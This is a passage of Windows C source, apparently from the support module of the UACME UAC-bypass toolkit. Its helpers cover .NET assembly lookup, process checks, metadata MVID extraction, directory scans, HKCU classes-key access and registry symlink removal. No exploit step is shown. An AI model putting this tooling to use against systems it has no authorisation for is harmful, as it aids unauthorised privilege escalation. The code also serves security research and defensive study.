    if (assemblyPath == NULL)
        return E_FAIL;

    asmInfo.pszCurrentAssemblyPathBuf = assemblyPath;

    hr = pInterface->lpVtbl->QueryAssemblyInfo(pInterface,
        QUERYASMINFO_FLAG_VALIDATE,
        lpAssemblyName,
        &asmInfo);

    if (!SUCCEEDED(hr)) {
        supHeapFree(asmInfo.pszCurrentAssemblyPathBuf);
    }
    else {
        *lpAssemblyPath = assemblyPath;
    }

    return hr;
}

/*
* supFusionGetAssemblyPathByName
*
* Purpose:
*
* Return given assembly file path.
*
* Note: Use supHeapFree to release lpAssemblyPath allocated memory.
*
*/
BOOLEAN supFusionGetAssemblyPathByName(
    _In_ LPWSTR lpAssemblyName,
    _Inout_ LPWSTR* lpAssemblyPath
)
{
    HRESULT hr;
    IAssemblyCache* asmCache = NULL;

    do {

        hr = g_ctx->FusionContext.CreateAssemblyCache(&asmCache, 0);
        if ((FAILED(hr)) || (asmCache == NULL))
            break;

        hr = supFusionGetAssemblyPath(asmCache,
            lpAssemblyName,
            lpAssemblyPath);

        asmCache->lpVtbl->Release(asmCache);

    } while (FALSE);

    return SUCCEEDED(hr);
}

/*
* supIsProcessRunning
*
* Purpose:
*
* Return TRUE if the given process is running in current session.
*
*/
BOOL supIsProcessRunning(
    _In_ LPWSTR ProcessName
)
{
    BOOL bResult = FALSE;
    ULONG nextEntryDelta = 0;
    PVOID processList;

    UNICODE_STRING lookupPsName;

    union {
        PSYSTEM_PROCESSES_INFORMATION Processes;
        PBYTE ListRef;
    } List;

    processList = supGetSystemInfo(SystemProcessInformation);
    if (processList == NULL)
        return bResult;

    List.ListRef = (PBYTE)processList;

    RtlInitUnicodeString(&lookupPsName, ProcessName);

    do {

        List.ListRef += nextEntryDelta;

        if (List.Processes->SessionId == NtCurrentPeb()->SessionId) {

            if (RtlEqualUnicodeString(&lookupPsName,
                &List.Processes->ImageName,
                TRUE))
            {
                bResult = TRUE;
                break;
            }

        }

        nextEntryDelta = List.Processes->NextEntryDelta;

    } while (nextEntryDelta);

    supHeapFree(processList);

    return bResult;
}

/*
* supFusionGetImageMVID
*
* Purpose:
*
* Query MVID value from image metadata.
*
*/
BOOL supFusionGetImageMVID(
    _In_ LPWSTR lpImageName,
    _Out_ GUID* ModuleVersionId
)
{
    BOOL bResult = FALSE;
    HMODULE hModule;
    PVOID baseAddress;
    IMAGE_COR20_HEADER* cliHeader;
    ULONG sz, offset;

    PBYTE streamData, streamPtr;

    STORAGESIGNATURE* pStorSign;
    STORAGEHEADER* pStorHeader;
    STORAGESTREAM* pStorStream;

    SIZE_T nameLen;
    WORD i = 0;
    RPC_STATUS st;

    st = UuidCreateNil(ModuleVersionId);
    if (st != S_OK)
        return FALSE;

    hModule = LoadLibraryEx(lpImageName, NULL, LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    if (hModule) {

        baseAddress = (PBYTE)(((ULONG_PTR)hModule) & ~3);

        cliHeader = (IMAGE_COR20_HEADER*)RtlImageDirectoryEntryToData(baseAddress, TRUE,
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR, &sz);

        pStorSign = (STORAGESIGNATURE*)RtlOffsetToPointer(baseAddress, cliHeader->MetaData.VirtualAddress);
        if (pStorSign->lSignature == 'BJSB') {

            offset = FIELD_OFFSET(STORAGESIGNATURE, pVersion) + pStorSign->iVersionString;
            pStorHeader = (STORAGEHEADER*)RtlOffsetToPointer(pStorSign, offset);

            streamPtr = (PBYTE)RtlOffsetToPointer(pStorHeader, sizeof(STORAGEHEADER));

            do {
                pStorStream = (STORAGESTREAM*)streamPtr;
                if (_strcmpi_a(pStorStream->rcName, "#GUID") == 0) {
                    if (pStorStream->iSize == sizeof(GUID)) {
                        streamData = (PBYTE)RtlOffsetToPointer(pStorSign, pStorStream->iOffset);
                        RtlCopyMemory(ModuleVersionId, streamData, sizeof(GUID));
                        bResult = TRUE;
                    }
                    break;
                }

                nameLen = _strlen_a(pStorStream->rcName) + 1;
                offset = ALIGN_UP(FIELD_OFFSET(STORAGESTREAM, rcName) + nameLen, ULONG);
                streamPtr = (PBYTE)RtlOffsetToPointer(streamPtr, offset);
                i++;

            } while (i < pStorHeader->iStreams);
        }

        FreeLibrary(hModule);
    }

    return bResult;
}

/*
* supxFusionScanFiles
*
* Purpose:
*
* Scan directory for files of given type.
*
* Note:
* Return TRUE to abort further scan, FALSE otherwise.
*
*/
BOOL supxFusionScanFiles(
    _In_ LPWSTR lpDirectory,
    _In_ LPWSTR lpExtension,
    _In_ pfnFusionScanFilesCallback pfnCallback,
    _In_opt_ PVOID pvUserContext
)
{
    BOOL bResult = FALSE;
    HANDLE hFile;
    LPWSTR lpLookupDirectory = NULL;
    SIZE_T sz, dirLen;
    WIN32_FIND_DATA fdata;

    dirLen = _strlen(lpDirectory);

    sz = (1 + dirLen + _strlen(lpExtension)) * sizeof(WCHAR);
    lpLookupDirectory = (LPWSTR)supHeapAlloc(sz);
    if (lpLookupDirectory) {

        _strcpy(lpLookupDirectory, lpDirectory);

        if (lpLookupDirectory[dirLen - 1] != L'\\') {
            lpLookupDirectory[dirLen] = L'\\';
            lpLookupDirectory[dirLen + 1] = 0;
        }

        _strcat(lpLookupDirectory, lpExtension);

        RtlSecureZeroMemory(&fdata, sizeof(fdata));
        hFile = FindFirstFile(lpLookupDirectory, &fdata);
        if (hFile != INVALID_HANDLE_VALUE) {
            do {

                if (pfnCallback(lpDirectory, &fdata, pvUserContext)) {
                    bResult = TRUE;
                    break;
                }

            } while (FindNextFile(hFile, &fdata));
            FindClose(hFile);
        }
        supHeapFree(lpLookupDirectory);
    }

    return bResult;
}

/*
* supFusionScanDirectory
*
* Purpose:
*
* Recursively scan directories looking for files with given extension.
*
*/
BOOL supFusionScanDirectory(
    _In_ LPWSTR lpDirectory,
    _In_ LPWSTR lpExtension,
    _In_ pfnFusionScanFilesCallback pfnCallback,
    _In_opt_ PVOID pvUserContext
)
{
    BOOL                bResult = FALSE;
    SIZE_T              dirLen;
    HANDLE              hDirectory;
    LPWSTR              lpFilePath;
    WIN32_FIND_DATA     fdata;

    if (lpDirectory == NULL || lpExtension == NULL)
        return FALSE;
    if (_strlen(lpExtension) > 16)
        return FALSE;

    if (supxFusionScanFiles(lpDirectory, lpExtension, pfnCallback, pvUserContext))
        return TRUE;

    dirLen = _strlen(lpDirectory);
    lpFilePath = (LPWSTR)supHeapAlloc((2 * MAX_PATH + dirLen) * sizeof(WCHAR));
    if (lpFilePath == NULL)
        return FALSE;

    _strcpy(lpFilePath, lpDirectory);

    if (lpFilePath[dirLen - 1] != L'\\') {
        lpFilePath[dirLen] = L'\\';
        lpFilePath[dirLen + 1] = 0;
        dirLen++;
    }

    lpFilePath[dirLen] = L'*';
    lpFilePath[dirLen + 1] = 0;

    RtlSecureZeroMemory(&fdata, sizeof(fdata));
    hDirectory = FindFirstFile(lpFilePath, &fdata);
    if (hDirectory != INVALID_HANDLE_VALUE) {
        do {
            if ((fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                (fdata.cFileName[0] != L'.')
                )
            {
                _strcpy(lpFilePath, lpDirectory);
                _strcat(lpFilePath, fdata.cFileName);

                bResult = supFusionScanDirectory(lpFilePath,
                    lpExtension,
                    pfnCallback,
                    pvUserContext);

                if (bResult)
                    break;

            }
        } while (FindNextFile(hDirectory, &fdata));
        FindClose(hDirectory);
    }

    supHeapFree(lpFilePath);

    return bResult;
}

/*
* supFusionFindFileByMVIDCallback
*
* Purpose:
*
* supFusionScanDirectory callback for MVID comparison.
*
*/
BOOL supFusionFindFileByMVIDCallback(
    _In_ LPWSTR CurrentDirectory,
    _In_ WIN32_FIND_DATA* FindData,
    _In_ PVOID UserContext
)
{
    FUSION_SCAN_PARAM* ScanParam = (FUSION_SCAN_PARAM*)UserContext;
    LPWSTR lpFileName;
    SIZE_T nLen, dirLen;
    GUID mVid;
    RPC_STATUS rpcStatus;

    dirLen = _strlen(CurrentDirectory);
    nLen = 2 + MAX_PATH + dirLen;
    lpFileName = (LPWSTR)supHeapAlloc(nLen * sizeof(WCHAR));
    if (lpFileName) {

        _strcpy(lpFileName, CurrentDirectory);

        if (lpFileName[dirLen - 1] != L'\\') {
            lpFileName[dirLen] = L'\\';
            lpFileName[dirLen + 1] = 0;
            dirLen++;
        }

        _strcat(lpFileName, FindData->cFileName);

        if (supFusionGetImageMVID(lpFileName, &mVid)) {

            if (0 == UuidCompare(ScanParam->ReferenceMVID,
                &mVid,
                &rpcStatus))
            {
                ScanParam->lpFileName = lpFileName;
                return TRUE;
            }
        }

        supHeapFree(lpFileName);
    }
    return FALSE;
}

/*
* supBinTextEncode
*
* Purpose:
*
* Create pseudo random string from UI64 value.
*
*/
VOID supBinTextEncode(
    _In_ unsigned __int64 x, 
    _Inout_ wchar_t* s
)
{
    char    tbl[64];
    char    c = 0;
    int     p;

    tbl[62] = '-';
    tbl[63] = '_';

    for (c = 0; c < 26; ++c)
    {
        tbl[c] = 'A' + c;
        tbl[26 + c] = 'a' + c;
        if (c < 10)
            tbl[52 + c] = '0' + c;
    }

    for (p = 0; p < 13; ++p)
    {
        c = x & 0x3f;
        x >>= 5;
        *s = (wchar_t)tbl[c];
        ++s;
    }

    *s = 0;
}

/*
* supGenerateSharedObjectName
*
* Purpose:
*
* Create pseudo random object name from it ID.
*
*/
VOID supGenerateSharedObjectName(
    _In_ WORD ObjectId,
    _Inout_ LPWSTR lpBuffer
)
{
    ULARGE_INTEGER value;

    value.LowPart = MAKELONG(
        MAKEWORD(UCM_VERSION_BUILD, UCM_VERSION_REVISION),
        MAKEWORD(UCM_VERSION_MINOR, UCM_VERSION_MAJOR));

    value.HighPart = MAKELONG(UACME_SHARED_BASE_ID, ObjectId);

    supBinTextEncode(value.QuadPart, lpBuffer);
}

/*
* supSetGlobalCompletionEvent
*
* Purpose:
*
* Set global completion event state to signaled.
*
*/
VOID supSetGlobalCompletionEvent(
    VOID)
{
    if (g_ctx->SharedContext.hCompletionEvent) {
        SetEvent(g_ctx->SharedContext.hCompletionEvent);
    }
}

/*
* supWaitForGlobalCompletionEvent
*
* Purpose:
*
* Wait a little bit for things to complete.
*
*/
VOID supWaitForGlobalCompletionEvent(
    VOID)
{
    LARGE_INTEGER liDueTime;

    if (g_ctx->SharedContext.hCompletionEvent) {
        liDueTime.QuadPart = -(LONGLONG)UInt32x32To64(200000, 10000);
        NtWaitForSingleObject(g_ctx->SharedContext.hCompletionEvent, FALSE, &liDueTime);
    }
}

/*
* supOpenClassesKey
*
* Purpose:
*
* Open required subkey of current user.
*
*/
NTSTATUS supOpenClassesKey(
    _In_opt_ PUNICODE_STRING UserRegEntry,
    _Out_ PHANDLE KeyHandle
)
{
    UNICODE_STRING usRootKey, usKeyName;
    HANDLE rootKeyHandle = NULL, keyHandle = NULL;
    OBJECT_ATTRIBUTES obja;
    NTSTATUS ntStatus;
    ULONG dummy;

    *KeyHandle = NULL;

    if (UserRegEntry == NULL) {

        ntStatus = RtlFormatCurrentUserKeyPath(&usRootKey);
        if (!NT_SUCCESS(ntStatus))
            return ntStatus;
    }
    else {
        RtlCopyMemory(&usRootKey, UserRegEntry, sizeof(UNICODE_STRING));
    }
    
    InitializeObjectAttributes(&obja, &usRootKey, OBJ_CASE_INSENSITIVE, NULL, NULL);

    ntStatus = NtOpenKey(&rootKeyHandle, MAXIMUM_ALLOWED, &obja);
    if (!NT_SUCCESS(ntStatus)) {
        RtlFreeUnicodeString(&usRootKey);
        return ntStatus;
    }

    RtlInitUnicodeString(&usKeyName, T_SOFTWARE_CLASSES);
    obja.ObjectName = &usKeyName;
    obja.RootDirectory = rootKeyHandle;

    ntStatus = NtCreateKey(&keyHandle,
        MAXIMUM_ALLOWED,
        &obja,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        &dummy);

    if (NT_SUCCESS(ntStatus))
        *KeyHandle = keyHandle;

    NtClose(rootKeyHandle);

    if (UserRegEntry == NULL)
        RtlFreeUnicodeString(&usRootKey);

    return ntStatus;
}


/*
* supRemoveRegLinkHKCU
*
* Purpose:
*
* Remove registry symlink for current user.
*
*/
NTSTATUS supRemoveRegLinkHKCU(
    _In_ LPWSTR lpszRegLink
)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    ULONG cbKureND;

    UNICODE_STRING usCurrentUser, usLinkPath;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING CmSymbolicLinkValue = RTL_CONSTANT_STRING(L"SymbolicLinkValue");

    PWSTR lpLinkKeyBuffer = NULL;
    SIZE_T memIO;

    HANDLE hKey = NULL;

    cbKureND = (ULONG)(_strlen(lpszRegLink)) * sizeof(WCHAR);

    InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = RtlFormatCurrentUserKeyPath(&usCurrentUser);
    if (!NT_SUCCESS(status))
        return status;

    do {

        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + cbKureND;
        lpLinkKeyBuffer = (PWSTR)supHeapAlloc(memIO);
        if (lpLinkKeyBuffer == NULL)
            break;

        usLinkPath.Buffer = lpLinkKeyBuffer;
        usLinkPath.Length = 0;
        usLinkPath.MaximumLength = (USHORT)memIO;

        status = RtlAppendUnicodeStringToString(&usLinkPath, &usCurrentUser);
        if (!NT_SUCCESS(status))
            break;

        status = RtlAppendUnicodeToString(&usLinkPath, lpszRegLink);
        if (!NT_SUCCESS(status))
            break;

        InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE | OBJ_OPENLINK, NULL, NULL);

        status = NtOpenKey(&hKey,
            KEY_ALL_ACCESS,
            &obja);

        if (NT_SUCCESS(status)) {
            status = NtDeleteValueKey(hKey, &CmSymbolicLinkValue);
            if (NT_SUCCESS(status))
                status = NtDeleteKey(hKey);
            NtClose(hKey);
        }

    } while (FALSE);

    if (lpLinkKeyBuffer) supHeapFree(lpLinkKeyBuffer);
    RtlFreeUnicodeString(&usCurrentUser);

    return status;
}

/*
* supFindPattern
*
* Purpose:
*
* Lookup pattern in buffer.
*
*/
PVOID supFindPattern(
    _In_ CONST PBYTE Buffer,
    _In_ SIZE_T BufferSize,
    _In_ CONST PBYTE Pattern,
    _In_ SIZE_T PatternSize
)
{
    PBYTE p0 = Buffer, pnext;

    if (PatternSize == 0)
        return NULL;

    if (BufferSize < PatternSize)
        return NULL;

    do {
        pnext = (PBYTE)memchr(p0, Pattern[0], BufferSize);
        if (pnext == NULL)
            break;

        BufferSize -= (ULONG_PTR)(pnext - p0);

        if (BufferSize < PatternSize)
            return NULL;

        if (memcmp(pnext, Pattern, PatternSize) == 0)
            return pnext;

        p0 = pnext + 1;
        --BufferSize;
    } while (BufferSize > 0);

    return NULL;
}

/*
* supLookupImageSectionByName
*
* Purpose:
*
* Lookup section pointer and size for section name.
*
*/
PVOID supLookupImageSectionByName(
    _In_ CHAR* SectionName,
    _In_ ULONG SectionNameLength,
    _In_ PVOID DllBase,
    _Out_ PULONG SectionSize
)
{
    BOOLEAN bFound = FALSE;
    ULONG i;
    PVOID Section;
    IMAGE_NT_HEADERS* NtHeaders = RtlImageNtHeader(DllBase);
    IMAGE_SECTION_HEADER* SectionTableEntry;

    //
    // Assume failure.
    //
    if (SectionSize)
        *SectionSize = 0;

    if (NtHeaders == NULL)
        return NULL;

    SectionTableEntry = (PIMAGE_SECTION_HEADER)((PCHAR)NtHeaders +
        sizeof(ULONG) +
        sizeof(IMAGE_FILE_HEADER) +
        NtHeaders->FileHeader.SizeOfOptionalHeader);

    //
    // Locate section.
    //
    i = NtHeaders->FileHeader.NumberOfSections;
    while (i > 0) {

        if (_strncmp_a(
            (CHAR*)SectionTableEntry->Name,
            SectionName,
            SectionNameLength) == 0)
        {
            bFound = TRUE;
            break;
        }

        i -= 1;
        SectionTableEntry += 1;
    }

    //
    // Section not found, abort scan.
    //
    if (!bFound)
        return NULL;

    Section = (PVOID)((ULONG_PTR)DllBase + SectionTableEntry->VirtualAddress);
    if (SectionSize)
        *SectionSize = SectionTableEntry->Misc.VirtualSize;

    return Section;
}
